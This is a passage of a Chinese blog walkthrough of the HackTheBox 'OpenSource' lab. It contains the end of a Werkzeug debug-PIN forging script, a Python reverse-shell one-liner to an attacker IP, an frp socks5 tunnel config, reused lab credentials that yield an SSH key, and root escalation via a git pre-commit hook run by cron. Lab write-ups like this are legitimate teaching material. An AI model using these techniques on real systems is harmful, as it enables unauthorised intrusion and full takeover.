+</span></span><span class="line"><span class="cl"><span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Pin: &#34;</span> <span class="o">+</span> <span class="n">rv</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png, https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png 1.5x, https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png"
+        title="https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png, https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png 1.5x, https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png"
+        title="https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png, https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png 1.5x, https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png"
+        title="https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png, https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png 1.5x, https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png"
+        title="https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="o">,</span><span class="nn">socket</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;10.10.16.8&#34;</span><span class="p">,</span><span class="mi">7000</span><span class="p">));[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">f</span><span class="p">)</span><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;sh&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png, https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png 1.5x, https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png"
+        title="https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png" /></p>
+<p>构建frp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[common]</span>
+</span></span><span class="line"><span class="cl"><span class="na">server_addr</span> <span class="o">=</span> <span class="s">10.10.16.8</span>
+</span></span><span class="line"><span class="cl"><span class="na">server_port</span> <span class="o">=</span> <span class="s">7777</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">[s5]</span>
+</span></span><span class="line"><span class="cl"><span class="na">type</span> <span class="o">=</span> <span class="s">tcp</span>
+</span></span><span class="line"><span class="cl"><span class="na">plugin</span> <span class="o">=</span> <span class="s">socks5</span>
+</span></span><span class="line"><span class="cl"><span class="na">remote_port</span> <span class="o">=</span> <span class="s">6000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现在<a href="http://172.17.0.1:3000/" target="_blank" rel="noopener noreffer ">http://172.17.0.1:3000/</a>存在一个Gitea页面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png, https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png 1.5x, https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png"
+        title="https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png" /></p>
+<p>利用<code>dev01:Soulless_Developer#2022</code>进行登录</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png, https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png 1.5x, https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png"
+        title="https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png" /></p>
+<p>在<code>home-backup/.ssh/id_rsa</code>中得到一个ssh私钥</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png, https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png 1.5x, https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png"
+        title="https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png, https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png 1.5x, https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png"
+        title="https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png" /></p>
+<h2 id="获取root权限">获取root权限</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png, https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png 1.5x, https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png"
+        title="https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png" /></p>
+<p>直接提权不行,用<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>也没找到可以利用的点</p>
+<p>上个<code>pspy</code>看进程监控</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5168   | /bin/sh -c /usr/local/bin/git-sync 
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5167   | /bin/sh -c /usr/local/bin/git-sync 
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5166   | /usr/sbin/CRON -f 
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5169   | git status --porcelain 
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=???  PID=5171   | ???
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5172   | git commit -m Backup for 2022-08-27 
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5173   | git push origin main 
+</span></span><span class="line"><span class="cl">2022/08/27 06:53:01 CMD: UID=0    PID=5174   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5182   | /bin/sh -c /root/meta/app/clean.sh 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5181   | /bin/sh -c cp /root/config /home/dev01/.git/config 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5180   | /usr/sbin/CRON -f 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5179   | /usr/sbin/CRON -f 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5178   | /usr/sbin/CRON -f 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5177   | /usr/sbin/CRON -f 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5183   | /bin/bash /root/meta/app/clean.sh 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5184   | /bin/sh -c /usr/local/bin/git-sync 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5187   | /bin/bash /root/meta/app/clean.sh 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5186   | git status --porcelain 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5189   | /bin/bash /root/meta/app/clean.sh 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5188   | /bin/bash /root/meta/app/clean.sh 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5190   | date +%Y-%m-%d 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5191   | /bin/bash /usr/local/bin/git-sync 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5192   | /bin/bash /usr/local/bin/git-sync 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5193   | git push origin main 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5199   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
+</span></span><span class="line"><span class="cl">2022/08/27 06:54:01 CMD: UID=0    PID=5221   | /lib/systemd/systemd-udevd 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以<code>root</code>权限运行<code>/usr/local/bin/git-sync</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/dev01/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> ! git status --porcelain<span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;No changes&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">day</span><span class="o">=</span><span class="k">$(</span>date +<span class="s1">&#39;%Y-%m-%d&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Changes detected, pushing..&#34;</span>
+</span></span><span class="line"><span class="cl">    git add .
+</span></span><span class="line"><span class="cl">    git commit -m <span class="s2">&#34;Backup for </span><span class="si">${</span><span class="nv">day</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    git push origin main
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用<code>git hooks</code>以<code>root</code>身份进行命令执行</p>
+<p><a href="https://segmentfault.com/a/1190000040370691" target="_blank" rel="noopener noreffer ">手写 git hooks 脚本（pre-commit、commit-msg）</a></p>
+<blockquote>
+<p>记得给<code>pre-commit</code>加权限</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png, https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png 1.5x, https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png"
+        title="https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png, https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png 1.5x, https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png"
+        title="https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-08-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/viper%E5%88%9D%E4%BD%93%E9%AA%8C/" class="prev" rel="prev" title="Viper"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Viper</a>
+            <a href="/htb-support/" class="next" rel="next" title="HackTheBox-Support">HackTheBox-Support<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
